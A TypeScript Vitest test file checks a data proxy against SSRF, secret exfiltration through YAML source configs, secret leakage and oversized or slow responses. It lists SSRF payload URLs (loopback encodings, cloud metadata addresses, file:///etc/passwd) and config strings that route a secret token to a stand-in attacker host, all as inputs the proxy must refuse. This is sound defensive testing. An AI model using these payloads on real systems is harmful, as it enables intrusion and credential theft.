// @vitest-environment node
import { generateKeyPairSync, randomBytes } from "node:crypto";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { AuditEvent } from "@/features/audit/domain/events";
import { parseConfig } from "@/features/config/domain/parse-config";
import { fetchSource } from "@/features/data-proxy/domain/fetch-source";
import { MAX_RESPONSE_BYTES, SOURCE_TIMEOUT_MS } from "@/features/data-proxy/domain/limits";
import { createSourceProxy, type CacheEntry } from "@/features/data-proxy/domain/source-proxy";
import { createGitHubProvider, GITHUB_API } from "@/features/repos/server/github";
import { createSecretLookup } from "@/features/secrets/server/lookup";
import { createSecrets, secretContext } from "@/features/secrets/server/service";
import type { SecretWrite } from "@/features/secrets/server/store";
import { decrypt, keyIdOf, parseKeyring, reencrypt } from "@/lib/crypto";
import { log } from "@/lib/logger";
import type { Resolver, Send, SsrfPolicy, SsrfRequest } from "@/lib/ssrf-guard";

/**
 * Everything the hub sends out on behalf of a `.hub.yml`, and everything it takes back (docs/scope.md, threat table).
 * The real guard, fetcher, secret service and data proxy run; only DNS, the wire and the database are made up.
 */

const PUBLIC = "93.184.216.34";
const CANARY = `canary-${randomBytes(18).toString("base64url")}`; // generated, so no scanner ever sees a secret here
const KEY = randomBytes(32).toString("base64");
const KEYS = parseKeyring(`k1:${KEY}`);

const DNS: Record<string, string[]> = {
  "nas.lan": ["192.168.1.20"],
  "intranet.test": ["10.1.2.3"],
  "both.test": [PUBLIC, "127.0.0.1"],
  "v6.test": ["::1"],
};

function network(answer: (request: SsrfRequest) => Response | Promise<Response> = () => Response.json({ ok: true })) {
  const sent: SsrfRequest[] = [];
  const resolve = vi.fn<Resolver>(async (host) => Reflect.get(DNS, host) ?? [PUBLIC]);
  const send: Send = async (request) => {
    sent.push(request);
    return answer(request);
  };
  return { sent, resolve, send };
}
const to = (location: string, status = 302) => new Response(null, { status, headers: { location } });
const ask = (url: string, net = network(), policy: SsrfPolicy = {}) => fetchSource(url, {}, policy, net);
const refusal = (job: Promise<unknown>) => job.then(
  () => "sent",
  (error: { code?: string }) => error.code,
);

/** A project with one secret bound to api.example.com, saved through the real service. */
async function hub(answer?: Parameters<typeof network>[0]) {
  const net = network(answer);
  const rows: SecretWrite[] = [];
  const audit: AuditEvent[] = [];
  const secrets = createSecrets({
    store: {
      repositoryId: async () => "r1",
      list: async () => rows.map(({ name, boundHosts }) => ({ name, boundHosts, updatedAt: new Date(0) })),
      save: async (entry) => void rows.push(entry),
      remove: async () => true,
    },
    keyring: () => KEYS,
    canManage: async () => true,
    now: () => new Date(),
    audit: async (event) => void audit.push(event),
  });
  const repo = { owner: "acme", name: "web" };
  const actor = { userId: "u1", login: "alice" };
  await secrets.save(repo, actor, { name: "TOKEN", value: CANARY, hosts: ["api.example.com"] });
  const cache = new Map<string, CacheEntry>();
  const proxy = createSourceProxy({
    store: {
      get: async (key) => cache.get(key) ?? null,
      put: async (key, _id, entry) => void cache.set(key, { ...entry, lastAccessedAt: entry.fetchedAt }),
      touch: async () => {},
      purgeUnusedSince: async () => 0,
    },
    fetch: (url, init, policy) => fetchSource(url, init, policy, net),
    loadPolicy: async () => ({}),
    loadSecrets: createSecretLookup({ reader: { encrypted: async () => rows }, keyring: () => KEYS }),
  });
  /** Runs the source `s` written as in a `.hub.yml`, through the config parser first. */
  async function source(yaml: string) {
    const parsed = parseConfig(`version: 1\nproject: {name: A}\nsources:\n  s: ${yaml}\npages:\n  - {id: main, title: Main, widgets: []}\n`);
    if (!parsed.ok) return { ok: false as const, errors: parsed.issues };
    const { url, method, headers, body } = parsed.config.sources.s;
    return proxy.get({ repositoryId: "r1", source: { url, method, headers, body, ttlSeconds: 60 } });
  }
  return { net, rows, audit, secrets, repo, actor, cache, source };
}

let output: string[];
beforeEach(() => {
  output = [];
  const keep = (chunk: unknown) => output.push(String(chunk)) > 0;
  vi.spyOn(process.stdout, "write").mockImplementation(keep);
  vi.spyOn(process.stderr, "write").mockImplementation(keep);
});
afterEach(() => vi.restoreAllMocks());

describe("threat: SSRF through source URLs", () => {
  it.each([
    "http://127.0.0.1/",
    "http://127.1/",
    "http://2130706433/",
    "http://0177.0.0.1/",
    "http://0x7f.0x0.0x0.0x1/",
    "http://0.0.0.0/",
    "http://10.0.0.1/",
    "http://100.64.0.1/",
    "http://172.16.0.1/",
    "http://192.168.1.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://[::]/",
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://[::ffff:0:127.0.0.1]/",
    "http://[64:ff9b::7f00:1]/",
    "http://[64:ff9b:1::1]/",
    "http://[2002:7f00:1::]/",
    "http://[fd00::1]/",
    "http://[fd00:ec2::254]/",
    "http://[fe80::1]/",
    "http://intranet.test/",
    "http://v6.test/",
    "http://both.test/",
  ])("refuses %s and sends nothing", async (url) => {
    const net = network();
    expect(await refusal(ask(url, net))).toBe("ssrf_address_blocked");
    expect(net.sent).toEqual([]);
  });

  it.each([
    ["file:///etc/passwd", "ssrf_scheme_blocked"],
    ["gopher://example.com/", "ssrf_scheme_blocked"],
    ["ftp://example.com/", "ssrf_scheme_blocked"],
    ["https://user:pass@example.com/", "ssrf_credentials_blocked"],
    ["not a url", "ssrf_invalid_url"],
  ])("refuses %s", async (url, code) => {
    const net = network();
    expect(await refusal(ask(url, net))).toBe(code);
    expect(net.sent).toEqual([]);
  });

  it("resolves once per hop and connects to the address it checked (DNS rebinding)", async () => {
    const net = network();
    net.resolve.mockResolvedValueOnce([PUBLIC]).mockResolvedValue(["127.0.0.1"]);
    await ask("https://rebind.test/", net);
    expect(net.resolve).toHaveBeenCalledTimes(1);
    expect(net.sent.map((r) => r.address)).toEqual([PUBLIC]);
  });

  it.each(["http://127.0.0.1/", "http://intranet.test/", "http://169.254.169.254/", "file:///etc/passwd"])(
    "refuses a redirect to %s",
    async (target) => {
      const net = network(() => to(target));
      expect(await refusal(ask("https://public.test/", net))).toMatch(/^ssrf_(address|scheme)_blocked$/);
      expect(net.sent).toHaveLength(1);
    },
  );

  it("follows 5 redirects at most", async () => {
    const net = network(() => to("/again"));
    expect(await refusal(ask("https://public.test/", net))).toBe("ssrf_too_many_redirects");
    expect(net.sent).toHaveLength(6);
  });

  it("opens a private host only on the instance admin's list, never a metadata address", async () => {
    expect(await refusal(ask("http://nas.lan/", network(), { adminAllow: ["nas.lan"] }))).toBe("sent");
    expect(await refusal(ask("http://intranet.test/", network(), { adminAllow: ["nas.lan"] }))).toBe("ssrf_address_blocked");
    for (const url of ["http://169.254.169.254/", "http://metadata.google.internal/"]) {
      const adminAllow = ["169.254.0.0/16", "metadata.google.internal"];
      expect(await refusal(ask(url, network(), { adminAllow }))).toBe("ssrf_address_blocked");
    }
  });

  it("a project's list cannot open a private range, only narrow", async () => {
    const projectAllow = ["intranet.test", "10.0.0.0/8"];
    expect(await refusal(ask("http://intranet.test/", network(), { projectAllow }))).toBe("ssrf_address_blocked");
    expect(await refusal(ask("https://public.test/", network(), { projectAllow }))).toBe("ssrf_host_not_allowed");
  });
});

describe("threat: Secret exfiltration through config", () => {
  const auth = "headers: { Authorization: 'Bearer ${TOKEN}' }";

  it("sends the secret to its bound host (the control for the refusals below)", async () => {
    const { net, source } = await hub();
    expect((await source(`{ url: 'https://api.example.com/a', ${auth} }`)).ok).toBe(true);
    expect(net.sent[0].headers.authorization).toBe(`Bearer ${CANARY}`);
  });

  it.each([
    ["another host", `{ url: 'https://attacker.test/', ${auth} }`],
    ["a look-alike suffix", `{ url: 'https://api.example.com.attacker.test/', ${auth} }`],
    ["a subdomain", `{ url: 'https://x.api.example.com/', ${auth} }`],
    ["a host hidden behind the bound one", `{ url: 'https://api.example.com@attacker.test/', ${auth} }`],
    ["a query on another host", "{ url: 'https://attacker.test/?k=${TOKEN}' }"],
    ["the host name", "{ url: 'https://${TOKEN}.attacker.test/' }"],
    ["the path", "{ url: 'https://api.example.com/${TOKEN}' }"],
    ["the fragment", "{ url: 'https://api.example.com/#${TOKEN}' }"],
    ["the body", "{ url: 'https://api.example.com/', method: POST, body: { k: '${TOKEN}' } }"],
  ])("an edit that moves the secret to %s fails with a structured error and nothing leaves", async (_, yaml) => {
    const { net, source } = await hub();
    const result = await source(yaml);
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.errors[0]).toMatchObject({ code: expect.stringMatching(/^(secret|config)_/), fix: expect.any(String) });
    expect(net.sent).toEqual([]);
  });

  it("a redirect away from the bound host does not take the header with it", async () => {
    const { net, source } = await hub((r) => (r.url.hostname === "api.example.com" ? to("https://attacker.test/") : Response.json({})));
    await source(`{ url: 'https://api.example.com/', ${auth} }`);
    expect(net.sent.map((r) => r.url.hostname)).toEqual(["api.example.com", "attacker.test"]);
    expect(JSON.stringify(net.sent[1])).not.toContain(CANARY);
  });

  it.each([
    ["to another host", (r: SsrfRequest) => `https://attacker.test/${r.url.search}`],
    ["down to plain http", (r: SsrfRequest) => `http://api.example.com/${r.url.search}`],
  ])("a redirect that echoes a query secret %s is refused", async (_, location) => {
    const { net, source } = await hub((r) => to(location(r)));
    const result = await source("{ url: 'https://api.example.com/?key=${TOKEN}' }");
    expect(result).toMatchObject({ ok: false, errors: [{ code: "ssrf_redirect_blocked" }] });
    expect(net.sent).toHaveLength(1);
  });

  it("stops showing what a secret fetched once it is rebound elsewhere or deleted", async () => {
    const { net, rows, source } = await hub();
    const yaml = `{ url: 'https://api.example.com/a', ${auth} }`;
    expect((await source(yaml)).ok).toBe(true);
    rows[0] = { ...rows[0], boundHosts: ["other.example.com"] };
    expect(await source(yaml)).toMatchObject({ ok: false, errors: [{ code: "secret_host_not_bound" }] });
    rows.length = 0;
    expect(await source(yaml)).toMatchObject({ ok: false, errors: [{ code: "secret_unknown" }] });
    expect(net.sent).toHaveLength(1);
  });

  it("reads the config from the default branch only: no ref is ever asked for", async () => {
    const privateKey = generateKeyPairSync("rsa", { modulusLength: 2048 }).privateKey.export({ type: "pkcs8", format: "pem" }).toString();
    const asked: string[] = [];
    const provider = createGitHubProvider({
      credentials: async () => ({ appId: "1", privateKey }),
      fetch: (async (input: string | URL | Request) => {
        const path = String(input).replace(GITHUB_API, "");
        asked.push(path);
        if (path.endsWith("/installation")) return Response.json({ id: 7 });
        if (path.endsWith("/access_tokens")) return Response.json({ token: "t", expires_at: "2099-01-01T00:00:00Z" }, { status: 201 });
        return new Response(null, { status: 404 });
      }) as typeof fetch,
    });
    await provider.getFile({ owner: "acme", name: "web" }, ".hub.yml");
    expect(asked.at(-1)).toBe("/repos/acme/web/contents/.hub.yml");
  });
});

describe("threat: Secret leakage", () => {
  it("stores only ciphertext tagged with its key, and never lists or audits a value", async () => {
    const { rows, audit, secrets, repo, actor } = await hub();
    expect(rows[0].keyId).toBe("k1");
    expect(keyIdOf(rows[0].ciphertext)).toBe("k1");
    expect(JSON.stringify([rows, audit, await secrets.list(repo, actor)])).not.toContain(CANARY);
  });

  it("detects a tampered or moved ciphertext, and re-encrypts under a new key", async () => {
    const { rows } = await hub();
    const { ciphertext } = rows[0];
    const context = secretContext("r1", "TOKEN");
    expect(decrypt(ciphertext, KEYS, context)).toBe(CANARY);
    const flipped = ciphertext.slice(0, -4) + (ciphertext.at(-4) === "A" ? "B" : "A") + ciphertext.slice(-3);
    expect(() => decrypt(flipped, KEYS, context)).toThrow();
    expect(() => decrypt(ciphertext, KEYS, secretContext("r2", "TOKEN"))).toThrow();

    const next = randomBytes(32).toString("base64");
    const rotated = reencrypt(ciphertext, parseKeyring(`k2:${next},k1:${KEY}`), context);
    expect(keyIdOf(rotated)).toBe("k2");
    expect(decrypt(rotated, parseKeyring(`k2:${next}`), context)).toBe(CANARY);
  });

  it("redacts a secret the source echoes back, in the answer and in the cache", async () => {
    const { cache, source } = await hub((r) => Response.json({ youSent: r.headers.authorization, url: r.url.href }));
    const result = await source("{ url: 'https://api.example.com/?key=${TOKEN}', headers: { Authorization: '${TOKEN}' } }");
    expect(result.ok).toBe(true);
    expect(JSON.stringify([result, [...cache]])).not.toContain(CANARY);
    expect(JSON.stringify(result)).toContain("[redacted]");
  });

  it.each([
    ["an error status", () => new Response(CANARY, { status: 500 })],
    ["bad JSON", () => new Response(CANARY, { headers: { "content-type": "application/json" } })],
    ["a transport error", (r: SsrfRequest) => Promise.reject(new Error(`refused ${r.url.href} ${r.headers.authorization}`))],
  ])("puts no secret in the error or the log after %s", async (_, answer) => {
    const { source } = await hub(answer);
    const result = await source("{ url: 'https://api.example.com/?key=${TOKEN}', headers: { Authorization: '${TOKEN}' } }");
    expect(result.ok).toBe(false);
    expect(output.join("")).toContain("source request failed");
    expect(JSON.stringify([result, output])).not.toContain(CANARY);
  });

  it("the logger blanks sensitive fields", () => {
    log("info", "x", { token: CANARY, headers: { authorization: CANARY }, password: CANARY });
    expect(output.join("")).not.toContain(CANARY);
  });
});

describe("threat: Response abuse", () => {
  const body = (stream: ReadableStream, headers: Record<string, string> = {}) =>
    network(() => new Response(stream, { headers: { "content-type": "application/json", ...headers } }));

  it("holds the limits of the scope: 5 MB and 3 seconds", () => {
    expect([MAX_RESPONSE_BYTES, SOURCE_TIMEOUT_MS]).toEqual([5 * 1024 * 1024, 3000]);
  });

  it("stops reading an endless body at the size cap and closes it", async () => {
    let pulled = 0;
    const cancel = vi.fn();
    const net = body(new ReadableStream({ pull: (c) => void (c.enqueue(new Uint8Array(65536)), (pulled += 65536)), cancel }));
    expect(await refusal(ask("https://public.test/", net))).toBe("source_too_large");
    expect(cancel).toHaveBeenCalled();
    expect(pulled).toBeLessThan(MAX_RESPONSE_BYTES + 4 * 65536);
  });

  it("refuses a declared length over the cap without reading", async () => {
    const net = body(new ReadableStream(), { "content-length": String(MAX_RESPONSE_BYTES + 1) });
    expect(await refusal(ask("https://public.test/", net))).toBe("source_too_large");
  });

  it.each([
    ["a body that never ends", () => new Response(new ReadableStream(), { headers: { "content-type": "application/json" } })],
    ["no answer at all", () => new Promise<Response>(() => {})],
  ])("times out on %s", async (_, answer) => {
    const net = { ...network(answer), timeoutMs: 30 };
    expect(await refusal(fetchSource("https://public.test/", {}, {}, net))).toBe("source_timeout");
  });

  it.each(["text/html", "text/plain", "application/octet-stream", ""])("refuses the content type '%s'", async (type) => {
    const net = network(() => new Response("{}", { headers: { "content-type": type } }));
    expect(await refusal(ask("https://public.test/", net))).toBe("source_content_type");
  });
});
